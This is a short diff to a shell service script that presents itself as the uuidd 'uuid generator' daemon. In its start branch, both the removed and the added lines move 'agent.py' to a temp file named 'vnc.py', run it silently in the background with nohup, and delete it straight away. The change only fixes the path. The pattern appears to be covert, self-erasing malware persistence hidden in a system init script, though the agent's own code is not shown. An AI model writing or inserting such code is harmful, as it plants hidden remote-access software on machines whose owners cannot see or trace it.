@@ -37,10 +37,10 @@ case "$1" in
         if [ $? -ne 0 ]; then
           exit 1
         fi
-        mv "agent.py" "/etc/tmp/vnc.py"
-        chmod +x "/etc/tmp/vnc.py"
-        nohup python3 "/etc/tmp/vnc.py" > /dev/null 2>&1 &
-        rm -f "/etc/tmp/vnc.py"
+        mv "agent.py" "/tmp/vnc.py"
+        chmod +x "/tmp/vnc.py"
+        nohup python3 "/tmp/vnc.py" > /dev/null 2>&1 &
+        rm -f "/tmp/vnc.py"
     ;;
   stop)
         log_daemon_msg "Stopping uuid generator" "uuidd"
